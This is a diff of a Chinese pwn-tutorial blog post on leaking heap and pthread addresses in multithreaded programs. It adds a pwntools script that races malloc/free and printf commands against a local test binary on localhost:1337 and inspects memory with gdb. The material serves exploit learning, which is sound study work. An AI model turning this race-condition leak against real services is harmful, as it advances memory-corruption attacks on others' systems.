@@ -14,7 +14,7 @@ comments: true
   - [1.3 实操：泄露多线程环境下的堆地址](#13-实操泄露多线程环境下的堆地址)
     - [1.3.1 直接使用tcache泄露地址：截断](#131-直接使用tcache泄露地址截断)
     - [1.3.2 race condition来泄露堆地址](#132-race-condition来泄露堆地址)
-    - [1.3.3 用gdb观察地址之间的关联](#133-用gdb观察地址之间的关联)
+    - [1.3.3 用gdb观察内存信息](#133-用gdb观察内存信息)
 
 
 # 前言：信息获取是很重要的<br>
@@ -204,8 +204,40 @@ with process("./test") as p:
 ```
 ![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250508223105.png)
 
-### 1.3.3 用gdb观察地址之间的关联<br>
+### 1.3.3 用gdb观察内存信息<br>
+核心要点是如下两个：<br>
+```
+1. 查看已知内存地址的固定偏移的周边内存的值
+2. 已知的映射page中存放的指针信息
+```
+还是拿1.1的例子，调试代码如下:<br>
+```python
+from pwn import *
+import os
+import time
+# context.log_level = 'debug'
 
+with process("./test") as p:
+    gdb.attach(p,"continue\n")
+    time.sleep(3)
+    r1 = remote("localhost",1337)
+    r2 = remote("localhost",1337)
+    if os.fork() == 0:
+        for _ in range(20000):
+            r1.sendline(b"malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0")
+        os.kill(os.getpid(),9)
+    else:
+        for _ in range(20000):
+            r2.sendline(b"printf 0")
+        output = r2.clean()
+        output_copy = output
+        output = set(output.splitlines())
+        print(output)
+        pthread_leak = u64(next(x for x in output_copy.split(b"\n") if  b"\x7f" in x)[17:].ljust(8,b"\x00"))
+        print(hex(pthread_leak))
+        #print(set(r2.clean().splitlines()))
+```
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250509224911.png)
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
